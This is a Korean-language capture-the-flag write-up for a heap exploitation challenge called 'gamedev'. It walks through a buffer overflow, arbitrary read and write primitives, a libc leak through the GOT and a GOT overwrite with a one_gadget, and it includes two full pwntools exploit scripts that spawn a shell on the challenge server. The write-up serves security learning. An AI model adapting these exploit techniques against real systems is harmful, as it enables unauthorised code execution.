# gamedev

## Description

---

You've heard of rogue-likes, but have you heard of heap-likes?

## Environment

---

![스크린샷 2025-02-09 오후 7.07.53.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/d7c428ab-9d3b-4532-96ac-f5b703ec13bc.png)

## 취약점 분석

---

### edit_level → BOF & Arbitrary Address Write

- `fgets(curr->data, 0x40, stdin);` 에 BOF 취약점 존재
    
    ```purescript
    struct Level
    {
        struct Level *next[8];
        char data[0x20];
    };
    ```
    
- BOF 이용하여 `next` 주소 Overwrite 가능
    - Level 0에서 `edit_level` 을 이용하여 **Level 1의 `next` Overwrite 가능**

### test_level → Arbitrary Address Read

- `edit_level` 과 연계하여 **임의 주소 읽기**가 가능하다.
    - `edit_level` 에서 BOF를 이용하여 Level 1의 `next` Overwrite
    - `explore(1)` → `explore(0)` 을 이용하여 임의 주소 접근 후 `test_level` 을 통한 **임의 주소 읽기**

- Why `explore(1)` → `explore(0)` ?

![스크린샷 2025-02-10 오후 2.53.22.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_2.53.22.png)

- `explore(1)` → `explore(0)` → `edit_level` 을 수행하면 **임의 주소 쓰기**도 가능하다.

## 코드 분석

---

- `Level` 의 포인터 형으로 `start` , `prev` , `curr` 존재

### init

- `init` 에서 starting level 할당
- 초기에는 `start` == `curr`

```purescript
void init()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    // Add starting level
    start = malloc(sizeof(struct Level));
    start->data[0] = '\0';
    for (int i = 0; i < 8; i++)
        start->next[i] = NULL;
    curr = start;
}
```

### curr를 변경하는 함수

- `explore`

```purescript
void explore()
{
    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }

    if (curr == NULL) {
        puts("No level to explore.");
        return;
    }
    
    curr = curr->next[idx];
}
```

- `reset`

```c
void reset()
{
    curr = start;
}
```

- `explore` 는 현재 레벨 기준으로 입력받은 인덱스의 레벨로 이동한다.
- `reset` 은 `curr` 을 시작 레벨로 복구한다.

### prev를 변경하는 함수

- `create_level`

```purescript
void create_level()
{
    if (prev == curr) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }

    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }
    
    struct Level *level = malloc(sizeof(struct Level));
    if (level == NULL) {
        puts("Failed to allocate level.");
        return;
    }

    level->data[0] = '\0';
    for (int i = 0; i < 8; i++)
        level->next[i] = NULL;

    prev = level;

    if (start == NULL)
        start = level;
    else
        curr->next[idx] = level;
}
```

- `create_level` 에서 새로운 레벨을 생성 후, `prev` 에 그 주소를 저장한다.

### We encourage game…

- `create_level` , `edit_level` , `test_level` 은 특정 조건에는 해당 함수를 사용할 수 없다.

```c
void create_level()
{
    if (prev == curr) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    ...
}

void edit_level()
{
    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    ...
}

void test_level()
{
    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    ...
}

```

- `curr` 은 `explore` 을 통해 변경할 수 있다.
- `prev` 는 `create_level` 을 통해 변경할 수 있다.
    - 새로 만들어진 레벨이 `prev`

- `create_level`
    - `if (prev == curr) ...`
    - 새로 만들어진 레벨로 바로 `explore` 했을 경우

- `edit_level`
    - `if (curr == prev || curr == start) ...`
        - `curr == prev`
            - 새로 만들어진 레벨로 바로 `explore` 했을 경우
        - `curr == start`
            - 단 한 번도 `explore` 하지 않았을 경우

- `test_level`
    - `if (curr == prev || curr == start) ...`
    - `edit_level` 과 동일

→ `edit` 또는 `test` 를 하려면, **시작 레벨 또는 방금 생성한 레벨**에 있으면 안된다.

### gdb

### test_level

- `[rip+0x2c90]` 에 `curr` 의 주소가 존재하고…

![스크린샷 2025-02-08 오후 9.52.31.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-08_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_9.52.31.png)

- `curr` 근처에 GOT가 존재한다..!
    - 뭘 알아서 찾은 건 아니고.. 주소 근처 값 확인하다가 우연히 찾았다.
    - `code_base` 아니까… `e.got['func']` 으로 찾아도 됐을 듯..

![스크린샷 2025-02-10 오후 3.11.56.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_3.11.56.png)

- ROP든 one_gadget이든 사용하려면 `libc_base` 를 구해야 하는데, 이 과정에서 아이디어가 떠올랐다.
- 함수가 한 번 호출되면 GOT가 갱신되어서 **실제 함수 주소**가 작성된다.
    - 이건 다 풀고 나서야 생각이 났다..
- `puts@got.plt` 의 값인 `0x00007ffff7e59980` 는 라이브러리 영역이고, 이를 이용하여 `libc_base` 를 구할 수 있다.

![스크린샷 2025-02-10 오후 3.15.53.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_3.15.53.png)

### edit_level

- `edit_level` 을 이용하여 BOF 및 임의 주소 쓰기가 가능한지 확인해보았다.
- Start Level에서 Level 0, Level 1을 만들었다.
- 그 후, `Start - Level 0` 에서 `edit_level` 을 이용하여 `AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDD` 입력을 전송한 상태다.

- `curr` 을 `start` 로 설정한 상태이다.

![스크린샷 2025-02-10 오후 3.22.21.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_3.22.21.png)

- 이 때 `start` 구조체의 값을 확인해보면 아래와 같다.

![스크린샷 2025-02-10 오후 3.23.19.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_3.23.19.png)

- `Start - Level 0` 의 주소 : `0x55555555b310`
- `Start - Level 1` 의 주소 : `0x55555555b380`

- `Start - Level 0` 및 `Start - Level 1` 구조체의 값을 확인하면 아래와 같다.

![스크린샷 2025-02-10 오후 3.26.33.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_3.26.33.png)

- `Start - Level 1` 의 `next[0]` , `next[1]` 영역이 `D (0x44)` 로 Overwrite 되었음을 확인할 수 있다.
- 이를 이용하여 임의 주소 쓰기도 가능함을 확인할 수 있었다.

- `gdb` 를 이용하여 알아낸 정보는 다음과 같다.
    - `edit_level` 을 이용하여 Overwrite 하려면 `target - 0x40` 을 Level 로 설정해야 함
    - `target-0x40` 을 설정하고, `test_level` 을 이용하면 **임의 주소 읽기**가 가능함

## 익스플로잇

---

### Step 1. Calc Code base

- 문제에서 `main` 의 주소를 제공한다.
- `code_base` 를 쉽게 구할 수 있다.
- PIE가 활성화 되어있으므로, `code_base` 와 `main` 사이의 오프셋을 구해야 한다.

![스크린샷 2025-02-10 오후 3.45.55.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_3.45.55.png)

![스크린샷 2025-02-10 오후 3.46.35.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_3.46.35.png)

![스크린샷 2025-02-10 오후 3.51.09.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_3.51.09.png)

- 문제에서 제공하는 `welcome gift` - `0x1662` = `code_base` 이다.

```c
p.recvuntil(b': ')
main_address = int(p.recvline()[:-1], 16)
code_base = main_address - 0x1662
```

### Step 2. Leak Libc base

- 임의 주소 읽기를 이용하여 GOT의 값을 읽고, `libc_base` 를 구한다.
- 이 때, Level 의 주소를 **읽고 싶은 주소 - `0x40`** 으로 설정해야 함에 유의한다.
    - `Level` 구조체가 `0x40` 의 `next` 이후에 `data` 가 존재하기 때문
- `puts` 의 주소와 `libc_base` 사이의 오프셋을 구해야 `libc_base` 를 구할 수 있다.

![스크린샷 2025-02-10 오후 4.01.55.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_4.01.55.png)

![스크린샷 2025-02-10 오후 3.46.35.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_3.46.35.png)

![스크린샷 2025-02-10 오후 4.02.20.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_4.02.20.png)

```python
# 0x4008은 gdb로 이용하여 구했습니다.
puts_got = code_base + 0x4008
# puts_got = code_base + e.got['puts'] 로 하는 것이 더 쉽고, 빠르고, 안전합니다.

print(hex(code_base))
print(hex(puts_got))
print(hex(code_base + e.got['puts']))

# Round 1
# Set Level to Overwrite next index
create_level(1) # start: 1
create_level(2) # start: 1 2
create_level(3) # start: 1 2 3
explore(1) # start-1

# Overwrite start-2's next[0]
payload = b'A' * 0x30 + p64(puts_got-0x40)
edit_level(payload)

# Leak libc base
reset()
explore(2) # start-2
explore(0) # start-2-0
test_level() # leak puts_got ?
p.recvuntil(b'data: ')
libc_puts = p.recvn(8)
libc_base = u64(libc_puts) - 0x77980
```

### Step 3. Overwrite exit’s GOT with one_gadget

- `exit` 의 GOT를 Overwrite한 이유는 딱히 없습니다.. 괜히 `printf` 처럼 자주 사용되는 함수 건드렸다가 오류날 것 같아서..
- `puts_got` 구할 때와 같이 `exit_got` 의 주소를 구한다.
- 해당 부분을 one_gadget 으로 Overwrite한다.
- 이 때, `Level` 의 주소를 `exit_got - 0x40` 으로 설정해야 `exit_got` Overwrite가 가능함에 유의한다.

![스크린샷 2025-02-10 오후 4.09.27.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_4.09.27.png)

- 조건을 전부 계산하고 one_gadget을 사용해야 하는데.. 귀찮으니까 전부 넣어보면 됩니다.
    - 그런데 이 문제는 `0xd511f` 를 사용해야 성공해서.. 애 좀 먹었습니다.
    - 내가 코드를 잘못 짰는지.. 가젯이 안 먹히는건지.. 알 수가 없음

```python
# 0x4c139 0x4c140 0xd511f
one_gadget = libc_base + 0xd511f

# Round 2
reset()
explore(1)

# Overwrite start-2's next[0] 
exit_got = code_base + 0x4040
payload = b'A' * 0x30 + p64(exit_got-0x40)
edit_level(payload)

# Overwrite exit_got with one_gadget
reset()
explore(2)
explore(0)
edit_level(p64(one_gadget))

# Exit to Get Shell
p.sendlineafter(b'Choice: ', str(6))

p.interactive()
```

### exploit.py

- 위 내용을 전부 종합한 `exploit.py` 는 아래와 같다.

```python
from pwn import *

context.log_level = 'debug'

p = remote('chall.lac.tf', 31338)
e = ELF('./chall')
# p = e.process()

def create_level(index):
    p.sendlineafter(b'Choice: ', str(1))
    p.sendlineafter(b'index: ', str(index))
    
def edit_level(data):
    p.sendlineafter(b'Choice: ', str(2))
    p.sendlineafter(b'data: ', data)
    
def test_level():
    p.sendlineafter(b'Choice: ', str(3))

def explore(index):
    p.sendlineafter(b'Choice: ', str(4))
    p.sendlineafter(b'index: ', str(index))

def reset():
    p.sendlineafter(b'Choice: ', str(5))

p.recvuntil(b': ')
main_address = int(p.recvline()[:-1], 16)
code_base = main_address - 0x1662
puts_got = code_base + 0x4008

print(hex(code_base))
print(hex(puts_got))
print(hex(code_base + e.got['puts']))

# Round 1
# Set Level to Overwrite next index
create_level(1) # start: 1
create_level(2) # start: 1 2
create_level(3) # start: 1 2 3
explore(1) # start-1

# Overwrite start-2's next[0]
payload = b'A' * 0x30 + p64(puts_got-0x40)
edit_level(payload)

# Leak libc base
reset()
explore(2) # start-2
explore(0) # start-2-0
test_level() # leak puts_got ?
p.recvuntil(b'data: ')
libc_puts = p.recvn(8)
libc_base = u64(libc_puts) - 0x77980

# 0x4c139 0x4c140 0xd511f
one_gadget = libc_base + 0xd511f

# Round 2
reset()
explore(1)

# Overwrite start-2's next[0] 
exit_got = code_base + 0x4040
payload = b'A' * 0x30 + p64(exit_got-0x40)
edit_level(payload)

# Overwrite exit_got with one_gadget
reset()
explore(2)
explore(0)
edit_level(p64(one_gadget))

# Exit to Get Shell
p.sendlineafter(b'Choice: ', str(6))

p.interactive()
```

![스크린샷 2025-02-10 오전 1.58.39.png](gamedev%20fd3e2266a94145349697dc11ed6fd002/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB_1.58.39.png)

- 다른 사람의 풀이

```python
#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

if args.REMOTE:
    r = remote("chall.lac.tf", 31338)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)

def create(idx: int):
    r.sendlineafter(b"Choice: ", b"1")
    r.sendlineafter(b"index: ", str(idx).encode())

def edit(data: bytes):
    r.sendlineafter(b"Choice: ", b"2")
    r.sendlineafter(b"data: ", data)

def read() -> bytes:
    r.sendlineafter(b"Choice: ", b"3")
    r.recvuntil(b"data: ")
    return r.recvline()

def explore(idx: int):
    r.sendlineafter(b"Choice: ", b"4")
    r.sendlineafter(b"index: ", str(idx).encode())

def reset():
    r.sendlineafter(b"Choice: ", b"5")

def arb_write(addr: int, data: bytes):
    create(0)
    create(1)
    explore(0)

    edit(b"A" * 0x38 + p64(addr - 0x40))
    reset()

    explore(1)
    explore(1)
    edit(data)
    reset()

def arb_read(addr: int) -> bytes:
    create(0)
    create(1)
    explore(0)

    edit(b"A" * 0x38 + p64(addr - 0x40))
    reset()

    explore(1)
    explore(1)
    res = read()
    reset()
    return res

r.recvuntil(b"gift: ")
exe.address = int(r.recvline().strip(), 16) - exe.sym.main
log.info(f"{hex(exe.address)=}")

libc.address = u64(arb_read(exe.got.printf)[:8]) - libc.sym.printf
log.info(f"{hex(libc.address)=}")

# GOT overwrite
arb_write(exe.got.atoi, p64(libc.sym.system))

r.sendlineafter(b"Choice: ", b"/bin/sh")

r.interactive()
```